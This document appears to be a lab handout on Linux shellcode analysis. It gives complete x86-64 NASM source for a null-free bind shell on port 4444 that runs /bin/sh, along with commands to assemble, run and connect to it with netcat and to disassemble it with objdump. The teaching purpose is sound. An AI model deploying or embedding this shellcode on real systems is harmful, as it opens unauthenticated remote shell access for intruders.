# Lab 14 – Shell Code Analysis on Linux

## Objective
Understand how shellcode works at the assembly level, assemble and link x86-64 shellcode, and disassemble the resulting object file using standard Linux tools.

---

## Tools Required

| Tool | Install | Purpose |
|---|---|---|
| `nasm` | `sudo apt install nasm` | Netwide Assembler – assembles `.nasm` to object files |
| `ld` | Included with `binutils` | GNU linker – links object files into an executable |
| `objdump` | Included with `binutils` | Disassembles binaries / object files |
| `netstat` | `sudo apt install net-tools` | Verify open ports |
| `nc` (netcat) | `sudo apt install netcat` | Connect to a listening shell |

---

## Workflow

### 1. Install NASM

```bash
sudo apt-get update
sudo apt-get install nasm
nasm -h    # verify installation
```

### 2. Assemble the Shellcode

```bash
nasm -f elf64 bindshell.nasm -o bindshell.o
```

| Flag | Meaning |
|---|---|
| `-f elf64` | Output format – 64-bit ELF object file |
| `-o` | Output filename |

### 3. Link into Executable

```bash
ld bindshell.o -o bindshell
./bindshell &
```

### 4. Verify the Port is Listening

```bash
netstat -nlt | grep 4444
```

Expected output:
```
tcp   0   0 0.0.0.0:4444   0.0.0.0:*   LISTEN
```

### 5. Connect via Netcat

```bash
nc localhost 4444
ls           # list directory
pwd          # current path
whoami       # current user
exit         # close connection
```

### 6. Disassemble the Object File

```bash
objdump -D -M intel bindshell.o
```

| Flag | Meaning |
|---|---|
| `-D` | Disassemble all sections |
| `-M intel` | Use Intel syntax (not AT&T) |

---

## Bindshell Shellcode (x86-64 Linux)

```nasm
BITS 64

xor eax, eax
xor ebx, ebx
xor edx, edx

; socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6)
mov al,  0x1
mov esi, eax
inc al
mov edi, eax
mov dl,  0x6
mov al,  0x29       ; syscall: socket
syscall
xchg ebx, eax       ; save server sockfd

; bind(sockfd, {AF_INET, 4444, INADDR_ANY}, 16)
xor  rax, rax
push rax
push 0x5c110102     ; port 4444 = 0x115c, AF_INET=2
mov  [rsp+1], al
mov  rsi, rsp
mov  dl,  0x10
mov  edi, ebx
mov  al,  0x31      ; syscall: bind
syscall

; listen(sockfd, 5)
mov al,  0x5
mov esi, eax
mov edi, ebx
mov al,  0x32       ; syscall: listen
syscall

; accept(sockfd, NULL, NULL)
xor edx, edx
xor esi, esi
mov edi, ebx
mov al,  0x2b       ; syscall: accept
syscall
mov edi, eax        ; save client sockfd

; dup2(clientfd, 0/1/2) – redirect stdin, stdout, stderr
xor rax, rax
mov esi, eax
mov al,  0x21       ; syscall: dup2 (stdin)
syscall
inc al
mov esi, eax
mov al,  0x21       ; syscall: dup2 (stdout)
syscall
inc al
mov esi, eax
mov al,  0x21       ; syscall: dup2 (stderr)
syscall

; execve("/bin/sh", ["/bin/sh", NULL], NULL)
xor rdx, rdx
mov rbx, 0x68732f6e69622fff
shr rbx, 0x8        ; shift out padding byte → "/bin/sh\0"
push rbx
mov  rdi, rsp
xor  rax, rax
push rax
push rdi
mov  rsi, rsp
mov  al,  0x3b      ; syscall: execve
syscall

push rax
pop  rdi
mov  al, 0x3c       ; syscall: exit
syscall
```

---

## Key Syscall Numbers (x86-64 Linux)

| Syscall | Number (`rax`) | Description |
|---|---|---|
| `socket` | `0x29` (41) | Create a socket |
| `bind` | `0x31` (49) | Bind socket to address/port |
| `listen` | `0x32` (50) | Mark socket as passive |
| `accept` | `0x2b` (43) | Accept incoming connection |
| `dup2` | `0x21` (33) | Duplicate file descriptor |
| `execve` | `0x3b` (59) | Execute a program |
| `exit` | `0x3c` (60) | Terminate process |

---

## Assembly Technique: Avoiding Null Bytes

Shellcode cannot contain `\x00` (null bytes) because string functions treat them as terminators.

| Technique | Example | Instead of |
|---|---|---|
| `xor reg, reg` to zero | `xor eax, eax` | `mov eax, 0` |
| `mov al` (byte) | `mov al, 0x29` | `mov eax, 0x29` |
| Bit-shift to strip padding | `shr rbx, 0x8` | Embed `\x00` in string |
